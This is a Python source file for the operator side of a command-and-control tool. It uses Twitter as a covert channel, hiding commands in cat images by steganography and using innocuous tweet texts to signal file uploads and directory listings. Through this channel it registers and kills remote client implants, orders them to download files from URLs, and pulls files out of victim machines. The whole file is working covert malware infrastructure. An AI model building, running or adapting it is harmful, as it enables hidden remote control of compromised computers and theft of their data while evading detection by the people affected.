import re
from handleMessage import encodeFile, decodeFile
import time
from signal import signal, SIGINT
from sys import exit
import tweepy
import keys
import urllib.request
import sys
import os
import random
import json
import math
import shutil

# File paths
catmsgPath = "msgs.txt"
savefilePath = "savefile"
hiddenFilePath = "hidden_file.txt"
# Globals
ids=[]
requestTime=0
checkedId=1259154221141803009 # this is the tweet Id
lastChecked=time.time()
savedata = {}
## limit stuff
lastRateLimit = 0
timeSinceRateLimit = 0
# API stuff
auth = tweepy.OAuthHandler(keys.consumer_key, keys.consumer_secret)
auth.set_access_token(keys.access_token, keys.access_token_secret)
api = tweepy.API(auth)
listen=False
interval=60
catMsgs=[]

helpString="Commands & Instructions"
helpString+="\n [ID] Command [Arg]"
helpString+="\n [ID] ls [AdditionalPath] - List directory where file is, if arg is \"none\",then it gets file directory"
helpString+="\n [ID] Download [URL] - Download File from URL"
helpString+="\n [ID] Upload [FilePath] - Upload simple unencoded text/img from Client to Server"
helpString+="\n [ID] Kill Null - Kill Client ID"
helpString+="\n 0 Shutdown - Shuts Down Server"
helpString+="\n 0 Listen - Switches to listening Mode"
helpString+="\n 0 List - Lists all active clients"
helpString+="\n 0 Scan - Manually scans once"
helpString+="\n 0 Status - Time till API rate reset"
helpString+="\n 0 Help - Prints this!"
helpString+="\n Note: If you'd like to remove the CLI, just use Listen. Then you won't have to input to check. Ctrl+C to Revert Back."

def printerr(message):
    print("[error]: " + message)

## timey stuff
def updateRateLimit():
    global timeSinceRateLimit
    timeSinceRateLimit = math.ceil(15-(time.time()-lastRateLimit)/60)
    return timeSinceRateLimit

def handleRateLimit():
    global lastRateLimit
    if (time.time() - lastRateLimit)/60 > 15:
        lastRateLimit = time.time()
    print("Error. Rate Limit Exceeded. Please wait " + str(updateRateLimit()) +" minutes") # have count down

'''
return: True if below rate limit else, False
'''
def checkRateLimit():
    global lastLimit
    
    if (time.time() - lastRateLimit)/60 > 15:
        print("Rate has not been exceeded.")
    else:
        print(str(updateRateLimit()) + " minutes till Rate reset.")

def isRateLimitExceeded():
    return (time.time() - lastRateLimit)/60 > 15

#Open Open Clients, but first, open cat msgs
def openState():
    global ids
    global catMsgs
    global checkedId
    global lastRateLimit
    catFile=open(catmsgPath)
    for line in catFile:
        catMsgs.append(str(line))
    catFile.close()
    with open(savefilePath) as save:
        savedata = json.load(save)
    
    ids = savedata['id']
    checkedId = savedata['checkedId']
    lastRateLimit = savedata['lastRateLimit']
    save.close()

#Save IDs before exit
def saveState():
    global checkedId
    savedata['id'] = ids
    savedata['checkedId'] = checkedId + 1 # add 1 so it doesn't check the same ID again
    savedata['lastRateLimit'] = lastRateLimit
    with open(savefilePath, "w") as save:
        json.dump(savedata, save)
    save.close()
    

#send file
def sendMessage(fname):
    global api
    try: 
        api.update_with_media(fname, catMsgs[random.randint(0, len(catMsgs)-1)])
    except:
        handleRateLimit()

#SIGINT Handler
def handler(sig,frame):
    global listen
    if(listen==False):
        saveState()
        print("Shutting down...")
        sys.exit(0)
    else:
        print("Listening mode inactive")
        listen==False
        return 1
'''
getTweets - Downloads the files of cats from twitter. 
Also Checks for uploads. If an upload exists, it will not add to the array
of images it returns, but rather, it will just extract the file.
'''
def getTweets():
    global api
    global checkedId
    global lastRateLimit
    public_tweets = []
    try:
        public_tweets = api.home_timeline(since_id = checkedId) #since_id=id to get since last check
    except tweepy.TweepError:
        handleRateLimit()
        return []
    lastRateLimit = 0

    imgs=[]
    for tweet in public_tweets:
        print("[debug] " + tweet.text)
        print("[debug] checkedId: " + str(checkedId))
        print("[debug] tweet.id: " + str(tweet.id))
        if(tweet.id > checkedId):
            print("[debug] incrementing checkedId to: " + str(tweet.id))
            checkedId = tweet.id + 1
        imagefiles = []
        if((tweet.text=="I love cats.") or (tweet.text=="I really love cats.")):
            print("[debug] File Upload found.")
            if 'media' in tweet.entities:
                url = media['media_url']
                print(media['media_url'])
                file_location = str(url)
                imagefiles.append(file_location)
                file_location =  file_location.rsplit('/', 1)[-1]
                urllib.request.urlretrieve(url, file_location)
                decodeFile(file_location)
                shutil.copyfile('hiddenfile.txt', 'downloaded.txt') # so file isn't overridden w/ additional commands
        
        elif(tweet.text=="Dogs are overrated."):
            print("[debug] ls found.")
            if 'media' in tweet.entities:
                url = media['media_url']
                print(media['media_url'])
                file_location = str(url)
                imagefiles.append(file_location)
                file_location =  file_location.rsplit('/', 1)[-1]
                urllib.request.urlretrieve(url, file_location)
                decodeFile(file_location)
                lsfile=open("hidden_file.txt")
                for line in lsfile:
                    print(line)
                lsfile.close()

        elif 'media' in tweet.entities: 
            for media in tweet.extended_entities['media']:
                url = media['media_url']
                print(media['media_url'])
                file_location = str(url)
                imagefiles.append(file_location)
                file_location = './images/' + file_location.rsplit('/', 1)[-1]
                urllib.request.urlretrieve(url, file_location)
                imgs.append(file_location)
        else:
            print("No New Tweets")
    return imgs

'''
Check Messages - only called if there is TCP Activity
and it's not been checked in past 5 minutes.
'''
def checkMessages():
    global lastChecked
    print("[debug] getting tweets...")
    newTweets=getTweets() #array of images with new image tweets - fetch this using API
    lastChecked=time.time()
    if len(newTweets) == 0:
        print("[debug] no new tweets")
        return
    try:
        for img in newTweets:
            print("[debug] file decoding...")
            decodeFile(img)
            print("[debug] file decoded.")
            time.sleep(3)        
            f=open(hiddenFilePath)
            print("[debug] file contents: ")
            for msg in f:
                print("  "+msg)
                form = re.findall(r"\d\sRegister",msg)
                kform = re.findall(r"\d\sKilled",msg)
                # Add this ID to list
                if(len(form) != 0):
                    msg=msg.split()
                    newClientID = msg[0]
                    ids.append(int(newClientID))
                    print("Client: " + newClientID + " has been registered.")
                    listClients()
                elif(len(kform) != 0):
                    msg=msg.split()
                    killedClientID = msg[0]
                    ids.remove(int(killedClientID))
                    print("Client: " + killedClientID + " has been killed.")
                    saveState()
                    listClients()
                else:
                    if(msg[0]=='0'):
                        print(msg)
            f.close()
    except Exception as e:
        print(e)
        pass

def listClients():
    print("List of open clients:")
    if len(ids) == 0:
        print("No open clients at the moment")
    else:
        for client in ids:
            print("\t" + str(client))
        

#Interactive Shell for Server Inputting Commands
def interact():
    global listen
    global interval
    global lastChecked
    print(helpString)
    print("Hello! What would you like to do today?")
    while(True):
        if(listen==False):
            cmd=input("\n[user]$ ")
            cmd=cmd.lower()
            form = re.findall(r"\d\s(download|kill|listen|shutdown|list|scan|status|upload|help|uploaddoc|ls)", cmd)
            if(form):
                args=cmd.split()
                print("[debug] cmd: " + cmd)
                if(args[0]=='0'):
                    if(args[1]=='listen'):
                        print('Listening mode active')
                        listen=True
                    elif(args[1]=='list'):
                        print('Listing clients...')
                        listClients()
                    elif(args[1]=='scan'):
                        print('Scanning messages...')
                        checkMessages()
                    elif(args[1]=='status'):
                        checkRateLimit()
                    elif(args[1]=='help'):
                        print(helpString)
                    elif(args[1]=='shutdown'):
                        print("Shutting down...")
                        saveState()
                        sys.exit(0)
                elif(int(args[0]) not in ids):
                    printerr("Client " + args[0] + " does not exist")
                    listClients()
                else:
                    f=open(hiddenFilePath,"w+")
                    f.write(cmd)
                    f.close()
                    encodeFile(hiddenFilePath,"images/cat" +str(random.randint(1,51))+".png")
                    sendMessage("new.png")
            else:
                print(helpString)
            if((time.time()-lastChecked)>interval and isRateLimitExceeded()):
                checkMessages()
        else:
            if((time.time()-lastChecked)>interval and isRateLimitExceeded()):
                checkMessages()


def main():
    signal(SIGINT, handler)
    openState()
    interact()

if __name__ == "__main__":
    main()
